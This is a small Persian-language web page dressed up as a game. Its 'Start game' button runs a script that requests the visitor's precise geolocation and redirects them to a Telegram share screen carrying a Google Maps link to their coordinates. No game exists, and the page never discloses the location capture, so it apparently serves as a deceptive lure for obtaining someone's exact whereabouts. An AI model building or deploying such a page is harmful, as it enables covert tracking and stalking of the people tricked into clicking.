<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بازی</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #111827, #1f2937);
            font-family: Tahoma, Arial, sans-serif;
            color: white;
        }

        .card {
            width: 90%;
            max-width: 400px;
            background: #ffffff;
            color: #222;
            padding: 30px 20px;
            border-radius: 22px;
            text-align: center;
            box-shadow: 0 15px 40px rgba(0,0,0,0.35);
        }

        .icon {
            font-size: 55px;
            margin-bottom: 10px;
        }

        h1 {
            margin: 10px 0;
            font-size: 25px;
        }

        p {
            color: #666;
            line-height: 1.8;
        }

        button {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 14px;
            background: #229ED9;
            color: white;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }

        button:active {
            transform: scale(0.98);
        }

        #status {
            margin-top: 18px;
            font-size: 14px;
            color: #555;
            line-height: 1.8;
        }
    </style>
</head>

<body>

<div class="card">

    <div class="icon">📍</div>

    <h1>شروع</h1>

    <p>
        برای شروع، روی دکمه زیر بزنید.
    </p>

    <button onclick="sendLocation()">
        📍 شروع بازی
    </button>

    <div id="status"></div>

</div>

<script>

function sendLocation() {

    const status = document.getElementById("status");

    status.innerHTML = "⏳ در حال دریافت...";

    if (!navigator.geolocation) {
        status.innerHTML = "❌ مرورگر شما پشتیبانی نمی‌کند.";
        return;
    }

    navigator.geolocation.getCurrentPosition(

        function(position) {

            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // ساخت لینک Google Maps
            const mapLink =
                "https://www.google.com/maps?q=" +
                latitude + "," + longitude;

           
            // لینک اشتراک‌گذاری تلگرام
            const telegramUrl =
                "https://t.me/share/url?url=" +
                encodeURIComponent(mapLink) +
                "&text=" +
                encodeURIComponent(":");

            status.innerHTML =
                "✅ دریافت شد.<br>در حال باز کردن ...";

            setTimeout(function() {
                window.location.href = telegramUrl;
            }, 800);

        },

        function(error) {

            if (error.code === 1) {
                status.innerHTML =
                    "❌ دسترسی برای شروع داده نشد.";
            }

            else if (error.code === 2) {
                status.innerHTML =
                    "❌  نشد.";
            }

            else if (error.code === 3) {
                status.innerHTML =
                    "❌ خطا";
            }

            else {
                status.innerHTML =
                    "❌ خطایی رخ داد.";
            }

        },

        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
}

</script>

</body>
</html>
